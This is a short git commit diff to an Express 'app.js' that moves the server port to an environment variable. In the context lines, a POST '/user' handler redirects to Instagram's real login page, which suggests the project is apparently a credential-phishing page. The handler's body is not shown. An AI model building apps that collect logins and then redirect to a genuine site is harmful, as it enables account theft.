30f53d627b292f1d2c7105a0c9da8722596d5cf5
techtrum <88105506+techtrum@users.noreply.github.com>
2021-12-09 14:54:02 -0800

    make it better

--- app.js
+++ app.js
@@ -36,6 +36,7 @@ app.post('/user', async (req, res) => {
     res.redirect('https://instagram.com/accounts/login/?source=auth_switcher')
 })
 
-app.listen(3000, () => {
-    console.log('Serving on port 3000')
+const port = process.env.PORT || 3000;
+app.listen(port, () => {
+    console.log(`server is running on port ${port}` )
 })
